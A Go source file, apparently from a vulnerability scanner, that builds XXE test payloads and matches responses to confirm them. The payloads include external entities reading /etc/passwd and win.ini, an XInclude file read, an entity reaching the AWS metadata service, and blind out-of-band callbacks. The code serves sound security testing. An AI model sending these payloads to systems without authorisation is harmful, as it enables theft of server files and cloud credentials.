package xxe

import (
	"fmt"
	"regexp"
)

// moduleMeta identifies one check module and how serious its findings are.
type moduleMeta struct{ id, name, severity string }

// The modules run in this order of evidence: first a safe internal-entity
// canary that proves the parser expands DOCTYPE entities at all, then reads
// that only succeed when the parser really fetched something, and finally the
// out-of-band callback, which is the only one that can confirm a fully blind
// XXE.
var (
	canaryModule   = moduleMeta{id: "entity-canary", name: "Internal entity expansion (canary)", severity: "medium"}
	fileReadModule = moduleMeta{id: "file-read", name: "External entity reads a local file", severity: "critical"}
	errorModule    = moduleMeta{id: "error-based", name: "External entity path leaked in a parser error", severity: "high"}
	xincludeModule = moduleMeta{id: "xinclude", name: "XInclude reads a local file", severity: "high"}
	ssrfModule     = moduleMeta{id: "ssrf-metadata", name: "External entity reaches a cloud metadata service", severity: "high"}
	oobModule      = moduleMeta{id: "oob-callback", name: "Blind XXE (out-of-band callback)", severity: "critical"}
)

// inbandPayload is one in-band attempt against a point. A response that
// matches pattern confirms it, unless the same pattern already shows up in the
// untouched baseline, which would make the match meaningless.
type inbandPayload struct {
	// label says what the payload tries to make the parser do, e.g. "reads /etc/passwd".
	label string
	// detail explains, for the finding, why a match means what it does.
	detail string
	build  func(t template, pt leaf) string
	// control, when set, sends the same DOCTYPE with its entity reference
	// removed. A match there means the response only echoed the payload back,
	// which proves nothing about the parser, so the finding is dropped.
	control    func(t template, pt leaf) string
	pattern    *regexp.Regexp
	confidence string
}

// inbandModule groups one module's in-band payloads. The first payload to
// match at a point settles that point.
type inbandModule struct {
	meta     moduleMeta
	payloads []inbandPayload
}

// inbandModules returns the in-band modules for one run. nonce is random per
// run: every marker built from it is unique, so a match cannot come from
// anything the target already served.
func inbandModules(nonce string) []inbandModule {
	// canaryDoctype builds the marker from a character reference, so the raw
	// payload never contains the expanded string. A match therefore only
	// happens when the parser actually expanded the entity.
	canaryText := "APERTURE-XXE-" + nonce
	canaryDoctype := fmt.Sprintf(`<!DOCTYPE aperture [<!ENTITY xxe "&#65;PERTURE-XXE-%s">]>`, nonce)

	missingPath := "file:///aperture-xxe-" + nonce + "/missing"
	missingDoctype := fmt.Sprintf(`<!DOCTYPE aperture [<!ENTITY xxe SYSTEM "%s">]>`, missingPath)

	metadataURL := "http://169.254.169.254/latest/meta-data/"
	metadataDoctype := fmt.Sprintf(`<!DOCTYPE aperture [<!ENTITY xxe SYSTEM "%s">]>`, metadataURL)

	entityRef := "&xxe;"

	return []inbandModule{
		{meta: canaryModule, payloads: []inbandPayload{{
			label:      "expands an internal entity",
			detail:     "A DOCTYPE entity with no network or file access came back expanded in the response, so the parser processes DOCTYPE entities. Every other in-band and callback check here depends on that.",
			build:      func(t template, pt leaf) string { return t.render(&pt, entityRef, canaryDoctype) },
			pattern:    regexp.MustCompile(regexp.QuoteMeta(canaryText)),
			confidence: ConfidenceConfirmed,
		}}},
		{meta: fileReadModule, payloads: []inbandPayload{
			{
				label:  "reads /etc/passwd",
				detail: "An external entity pointing at file:///etc/passwd came back in the response. The parser read a local file on the server.",
				build: func(t template, pt leaf) string {
					return t.render(&pt, entityRef, `<!DOCTYPE aperture [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`)
				},
				pattern:    regexp.MustCompile(`root:[x*!]:0:0:`),
				confidence: ConfidenceConfirmed,
			},
			{
				label:  "reads C:\\Windows\\win.ini",
				detail: "An external entity pointing at file:///C:/Windows/win.ini came back in the response. The parser read a local file on a Windows server.",
				build: func(t template, pt leaf) string {
					return t.render(&pt, entityRef, `<!DOCTYPE aperture [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>`)
				},
				pattern:    regexp.MustCompile(`(?i)\[extensions\]|for 16-bit app support`),
				confidence: ConfidenceConfirmed,
			},
		}},
		{meta: errorModule, payloads: []inbandPayload{{
			label:   "leaks a missing file path in a parser error",
			detail:  "An external entity pointing at a path that does not exist came back in the response, so the parser tried to open it and reported the failure. That shows the parser resolves external entities, and a file that does exist would be read the same way. Not a file read on its own.",
			build:   func(t template, pt leaf) string { return t.render(&pt, entityRef, missingDoctype) },
			control: func(t template, pt leaf) string { return t.render(&pt, pt.original(t), missingDoctype) },
			// The path only counts when an error phrase sits next to it. A parser
			// that echoes the DOCTYPE back (libxml2 does) repeats the path
			// without any error wording, so the echo can't match.
			pattern:    regexp.MustCompile(`(?i)(failed to load|could not load|could not find|cannot open|can't open|unable to open|no such file|i/o error|does not exist|not found|error loading|filenotfoundexception)[^\n]{0,160}aperture-xxe-` + nonce),
			confidence: ConfidenceLikely,
		}}},
		{meta: xincludeModule, payloads: []inbandPayload{{
			label:  "reads /etc/passwd via XInclude",
			detail: "An XInclude element with parse=\"text\" pointing at file:///etc/passwd came back in the response. This works where the operator cannot add a DOCTYPE, so the value is placed inside a document the server builds itself.",
			build: func(t template, pt leaf) string {
				return t.render(&pt, `<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>`, "")
			},
			pattern:    regexp.MustCompile(`root:[x*!]:0:0:`),
			confidence: ConfidenceConfirmed,
		}}},
		{meta: ssrfModule, payloads: []inbandPayload{{
			label:      "fetches the AWS metadata service",
			detail:     "An external entity pointing at the cloud metadata address came back with content only that service returns. The parser made the request from inside the server's network, which is an SSRF reached through XML.",
			build:      func(t template, pt leaf) string { return t.render(&pt, entityRef, metadataDoctype) },
			control:    func(t template, pt leaf) string { return t.render(&pt, pt.original(t), metadataDoctype) },
			pattern:    regexp.MustCompile(`(?i)ami-id|instance-id|iam/security-credentials|metadata-flavor|"project-id"|azenvironment|subscriptionid|droplet_id`),
			confidence: ConfidenceConfirmed,
		}}},
	}
}

// original returns the text this point already holds. The control payloads
// use it to keep the point's text in place while the entity reference is
// removed.
func (l leaf) original(t template) string {
	return t.text[l.start:l.end]
}

// oobVariant is one blind payload. Each variant gets its own path under the
// point's token, so a hit's Identifier says which variant the parser fired on.
type oobVariant struct {
	name string
	// dns sends the callback as a hostname under the DNS domain instead of an
	// HTTP URL.
	dns   bool
	build func(t template, pt leaf, cb string) string
}

// oobVariants returns the blind payloads to send. The DNS one is only included
// when a DNS domain is configured, since without it there is no hostname to
// resolve.
func oobVariants(cfg OOBConfig) []oobVariant {
	variants := []oobVariant{
		{
			// A general external entity is fetched only when the parser
			// expands it, so this one also needs the value to be referenced.
			name: "entity",
			build: func(t template, pt leaf, cb string) string {
				return t.render(&pt, "&xxe;", fmt.Sprintf(`<!DOCTYPE aperture [<!ENTITY xxe SYSTEM "%s">]>`, cb))
			},
		},
		{
			// A parameter entity whose external DTD is fetched while the
			// document is still being parsed. Parsers that skip general
			// entities, or that never expand the value, still fetch this.
			name: "parameter-entity",
			build: func(t template, pt leaf, cb string) string {
				return t.render(&pt, pt.original(t), fmt.Sprintf(`<!DOCTYPE aperture [<!ENTITY %% pe SYSTEM "%s"> %%pe;]>`, cb))
			},
		},
	}
	if cfg.DNSDomain != "" {
		variants = append(variants, oobVariant{
			name: "dns",
			dns:  true,
			build: func(t template, pt leaf, cb string) string {
				return t.render(&pt, "&xxe;", fmt.Sprintf(`<!DOCTYPE aperture [<!ENTITY xxe SYSTEM "%s">]>`, cb))
			},
		})
	}
	return variants
}
